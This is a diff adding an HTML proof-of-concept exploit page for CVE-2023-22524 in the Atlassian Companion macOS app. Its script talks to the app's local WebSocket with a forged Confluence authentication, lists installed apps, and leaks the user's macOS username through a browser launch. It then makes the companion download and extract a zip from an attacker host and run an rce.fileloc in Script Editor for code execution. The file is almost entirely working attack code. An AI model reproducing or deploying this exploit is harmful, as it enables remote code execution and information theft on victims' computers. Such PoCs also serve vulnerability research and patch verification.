@@ -1,0 +1,181 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>CVE-2023-22524</title>
+  </head>
+
+  <body>
+    <pre></pre>
+    <iframe style="display: none" id="iframe_helper"></iframe>
+    <script>
+      let ws = null,
+        global_resolve = null,
+        username = null;
+      let STAGE = !location.href.includes(".atlassian-companion") ? 1 : 2;
+      const HOSTNAME = "http://localhost:8080";
+      const iframe_helper = document.getElementById("iframe_helper");
+
+      const PREPARE_USERNAME_LEAK = 1;
+      const LEAK_USERNAME = 2;
+      const RCE = 3;
+
+      if (location.href.includes("username=")) {
+        username = decodeURIComponent(location.href.split("username=")[1]);
+        STAGE = 3;
+      }
+
+      function handleLocalStage() {
+        const macosUsername = window.location.href
+          .split("Users/")[1]
+          .split("/")[0];
+        _print("[+] Username: " + macosUsername);
+        iframe_helper.src = HOSTNAME + "?username=" + macosUsername;
+        iframe_helper.style.display = "block";
+      }
+
+      function main() {
+        _print("[+] main");
+        _print("[+] STAGE: " + STAGE);
+
+        if (STAGE === LEAK_USERNAME) {
+          return handleLocalStage();
+        }
+
+        ws = new WebSocket("ws://127.0.0.1:31459");
+        ws.onopen = async () => {
+          _print("[+] WebSocket opened");
+          const response = await send({
+            type: "authentication",
+            payload: {
+              payload: { siteTitle: " https://confluence.atlassian.com" },
+              provider: "server",
+            },
+          });
+
+          switch (STAGE) {
+            case PREPARE_USERNAME_LEAK:
+              let apps = await getApplicationUUIDByMimeType("text/html");
+              if (apps.length === 0) {
+                return _print("[-] No programs found that can open html files");
+              }
+              let browser = apps.find((app) => app.displayName === "Chrome");
+              if (!browser) {
+                browser = apps.find((app) => app.displayName === "Safari");
+              }
+              if (!browser) {
+                return _print("[-] No browser found");
+              }
+              await send({
+                transactionID: await newTx(),
+                type: "launch-file-in-app",
+                payload: {
+                  type: "file",
+                  fileURL: HOSTNAME,
+                  applicationID: browser.id,
+                  fileName: "hello.htm",
+                  autoUpload: false,
+                },
+              });
+              break;
+            case RCE:
+              const scriptEditor = (
+                await getApplicationUUIDByMimeType("text/markdown")
+              ).find((app) => app.displayName === "Script Editor");
+              const archiveUtility = (
+                await getApplicationUUIDByMimeType("application/gzip")
+              ).find((app) => app.displayName === "Archive Utility");
+              const testZipFileResponse = await send({
+                transactionID: await newTx(),
+                type: "launch-file-in-app",
+                payload: {
+                  type: "file",
+                  fileURL: HOSTNAME + "/test.zip",
+                  applicationID: archiveUtility.id,
+                  fileName: "test.zip",
+                  autoUpload: false,
+                },
+              });
+              const testZipUUID = testZipFileResponse.payload;
+              const testAppPath = `file:///Users/${username}/.atlassian-companion/${testZipUUID}/test.app`;
+              // give some time for the zip to be extracted
+              await new Promise((resolve) => setTimeout(resolve, 500));
+              await send({
+                transactionID: await newTx(),
+                type: "launch-file-in-app",
+                payload: {
+                  type: "file",
+                  fileURL:
+                    HOSTNAME +
+                    "/rce.fileloc?path=" +
+                    encodeURIComponent(testAppPath),
+                  applicationID: scriptEditor.id,
+                  fileName: "rce.fileloc",
+                  autoUpload: false,
+                },
+              });
+              break;
+          }
+        };
+        ws.onclose = function () {
+          _print("[-] WebSocket closed");
+        };
+        ws.onmessage = async function (e) {
+          _print("[+] Received message: " + e.data);
+          const message = JSON.parse(e.data);
+
+          if (global_resolve !== null) {
+            global_resolve(message);
+            global_resolve = null;
+            return;
+          }
+        };
+      }
+
+      window.addEventListener("load", main);
+    </script>
+    <script>
+      // Helper functions
+      // ----------------
+
+      const pre = document.querySelector("pre");
+
+      function _print(text) {
+        pre.textContent += text + "\n";
+      }
+
+      async function getApplicationUUIDByMimeType(mimeType) {
+        const response = await send({
+          transactionID: await newTx(),
+          type: "list-apps",
+          payload: { type: "file", mimeType, fileName: "hello.txt" },
+        });
+        return response.payload;
+      }
+
+      function send(msg) {
+        return new Promise((resolve) => {
+          if (ws.readyState === WebSocket.OPEN) {
+            global_resolve = resolve;
+            let jsonMessage = JSON.stringify(msg);
+            _print("[+] Sending: " + jsonMessage);
+            ws.send(jsonMessage);
+          } else {
+            _print("[-] WebSocket not open");
+            resolve(null);
+            global_resolve = null;
+          }
+        });
+      }
+
+      const newTx = async () => {
+        const response = await send({
+          type: "new-transaction",
+          payload: { transactionType: "file" },
+        });
+        return response.payload;
+      };
+    </script>
+  </body>
+</html>
